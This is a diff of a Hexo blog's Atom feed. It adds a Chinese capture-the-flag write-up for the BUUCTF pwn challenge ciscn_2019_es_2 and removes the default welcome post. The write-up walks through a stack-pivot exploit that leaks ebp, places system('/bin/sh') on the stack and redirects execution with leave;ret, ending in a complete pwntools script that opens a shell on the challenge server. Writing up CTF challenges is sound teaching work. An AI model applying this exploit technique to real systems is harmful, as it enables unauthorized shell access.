@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-03-12T14:11:49.065Z</updated>
+  <updated>2022-03-12T15:20:44.233Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf-ciscn_2019_es_2</title>
+    <link href="http://example.com/2022/03/12/buuctf-ciscn-2019-es-2/"/>
+    <id>http://example.com/2022/03/12/buuctf-ciscn-2019-es-2/</id>
+    <published>2022-03-12T15:20:03.000Z</published>
+    <updated>2022-03-12T15:20:44.233Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found//没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)//没开</span><br></pre></td></tr></table></figure><p>没什么好说的运行一下</p><p><img src="/2022/03/12/buuctf-ciscn-2019-es-2/image-20220312224457620.png" alt="image-20220312224457620"></p><p>输入过多会打印出一些值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看上面我就知道,只能泄漏出ebp然栈迁移到s里面进行调用getshell!</p><p>利用思路(<code>栈迁移</code>)</p><p>利用第一次输入输出来泄漏出ebp的地址,然后推算出s在栈中的地址,然后第2次来往栈中写入system(/bin/sh),来达到getshell的地步，之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell</p><p>现在开始理清楚思路:</p><h2 id="一-泄漏ebp地址"><a href="#一-泄漏ebp地址" class="headerlink" title="一,泄漏ebp地址"></a>一,泄漏ebp地址</h2><p>printf函数在输出的时候遇到’\0‘会停止，如果我们将参数s全部填满，这样就没法在末尾补上’\0‘，那样就会将ebp连带着输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p.u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h2 id="二-找到参数s在栈上的位置"><a href="#二-找到参数s在栈上的位置" class="headerlink" title="二,找到参数s在栈上的位置"></a>二,找到参数s在栈上的位置</h2><p>gdb中printf设置断点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; b *printf</span><br><span class="line">pwndbg&gt; r</span><br></pre></td></tr></table></figure><p><img src="/2022/03/12/buuctf-ciscn-2019-es-2/image-20220312225809165.png" alt="image-20220312225809165"></p><p><img src="/2022/03/12/buuctf-ciscn-2019-es-2/image-20220312225854619.png" alt="image-20220312225854619"></p><p>开始计算</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xffffcfc8-0xffffcf90=0x38</span><br></pre></td></tr></table></figure><h3 id="三-布置s栈上的值"><a href="#三-布置s栈上的值" class="headerlink" title="三.布置s栈上的值"></a>三.布置s栈上的值</h3><p>由于我们要用到leave;ret来劫持栈，所以先找一下leva;ret的位置(这个好像没有什么要求),</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload2=&#x27;aaaa&#x27;+p32(sys)+p32(main)+p32(s+0x10)+&quot;/bin/sh&quot;</span><br><span class="line">aaaa是给栈迁移后ebp留出来的空间,这个计算system_plt的位置,main这个地址是system返回地址随便填,p32(s+0x10)这个位置应该是system的参数，但是程序中并没有现成的，所以只能把&#x27;/bin/sh\x00&#x27;写到后面，然后这里填s的地址加上16的偏移就是参数了，接下来就是把s填充满0x28，再后面的内容就是实现栈迁移了。</span><br><span class="line">payload2=payload2.ljust(0x28,&#x27;\x00&#x27;)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28771</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./ciscn_2019_es_2&#x27;)</span></span><br><span class="line">sys=<span class="number">0x8048400</span></span><br><span class="line">leave_ret=<span class="number">0x08048562</span></span><br><span class="line">main=<span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x27</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">s=ebp=u32(r.recv(<span class="number">4</span>))-<span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys)+p32(main)+p32(s+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(s)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.send(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;ciscn-2019-es-2&quot;&gt;&lt;a href=&quot;#ciscn-2019-es-2&quot; class=&quot;headerlink&quot; title=&quot;ciscn_2019_es_2&quot;&gt;&lt;/a&gt;ciscn_2019_es_2&lt;/h1&gt;&lt;figure class=&quot;highli</summary>
+      
+    
+    
+    
+    
+    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>buuctf-ciscn_2019_s_3</title>
@@ -440,26 +462,6 @@
     
     
     <category term="xctf-pwn" scheme="http://example.com/tags/xctf-pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Hello World</title>
-    <link href="http://example.com/2021/11/08/hello-world/"/>
-    <id>http://example.com/2021/11/08/hello-world/</id>
-    <published>2021-11-08T04:46:57.765Z</published>
-    <updated>2021-11-08T04:46:57.765Z</updated>
-    
-    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
-      
-    
-    
-    
     
   </entry>
   
